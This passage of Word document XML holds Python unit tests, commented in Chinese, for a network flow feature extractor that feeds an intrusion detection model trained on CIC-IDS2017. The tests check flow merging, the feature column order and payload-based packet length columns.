        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24B82C0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def pkt(ts, src=("10.0.0.1", 50000), dst=("10.0.0.2", 80), length=60, payload=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535F6956">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flags=SYN | ACK, proto=6, tcp_window=29200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2700ABBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """造一个包。默认值让调用处只写和本例有关的参数。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271B0687">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return PacketRecord(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025F3543">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ts=ts,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D00CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        src_ip=src[0], src_port=src[1], dst_ip=dst[0], dst_port=dst[1],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4812EA43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proto=proto,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B737D53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        length=length,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A04B363">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        header_len=40 if proto == 6 else 28,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7777EB53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        payload_len=payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432A7393">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tcp_flags=flags,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8EB615">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tcp_window=tcp_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443A874C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tcp_header_len=20 if proto == 6 else -1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B876AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E41C95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E92BF04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="716582C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_feature_order_matches_trained_schema():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61363A2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：提取器和模型的特征列一旦错位，线上推理不会报错，只会静默误判。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540F2ABD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    这个断言把"提取器口径"和"训练产物口径"绑在一起。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248066A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    schema = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E02BCF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert FEATURE_ORDER == schema["feature_names"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D727CD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(set(FEATURE_ORDER)) == 78</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F5FA02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F8EE822">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E10C37C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_two_directions_merge_into_one_flow():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23881293">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279B27AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(1000.0, payload=100, flags=SYN))              # 首包定方向：1 -&gt; 2 是 fwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A753D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(1000.5, src=("10.0.0.2", 80), dst=("10.0.0.1", 50000), payload=500, flags=ACK))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D864045">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(1001.0, payload=200, flags=PSH | ACK))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C4888D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72B05035">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(table.flows) == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5059EB68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flow = next(iter(table.flows.values()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F63715">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(flow)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725A850B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Total Fwd Packets"] == 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646B8F34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Total Backward Packets"] == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C233E24">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Destination Port"] == 80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0D76C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Init_Win_bytes_forward"] == 29200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558EFF1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["act_data_pkt_fwd"] == 2     # 两个 fwd 包都带载荷</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668C7874">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 时长单位是微秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2F4ED0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Flow Duration"] == pytest.approx(1_000_000.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0ECC29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13BD3BDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="027AD5EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_packet_length_columns_count_l4_payload_only():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071F8410">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：CIC-IDS2017 的包长列统计的是 L4 载荷。一个 60 字节的纯 SYN（载荷 0）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA9052D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    在数据集里是 "Packet Length Mean = 0"，用 IP 总长度算出来是 60——这一列错位</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7441D432">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    会让线上每一条流的向量都落在训练分布之外（实测 z 分数十几到上千）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048C0258">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8699A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(1000.0, length=60, payload=0, flags=SYN))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3298B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165C8ECB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Fwd Packet Length Max"] == 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD9749B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Packet Length Mean"] == 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0286C74C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Average Packet Size"] == 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333FF5C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Total Length of Fwd Packets"] == 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4790E0AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="504B196A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = FlowTable()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CE11A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table.add(pkt(1000.0, length=100, payload=60, flags=PSH | ACK))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445CF328">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = flow_features(next(iter(table.flows.values())))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49575D6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert feats["Packet Length Mean"] == 60.0           # 100 字节的包里 40 字节是头</w:t>
      </w:r>
    </w:p>
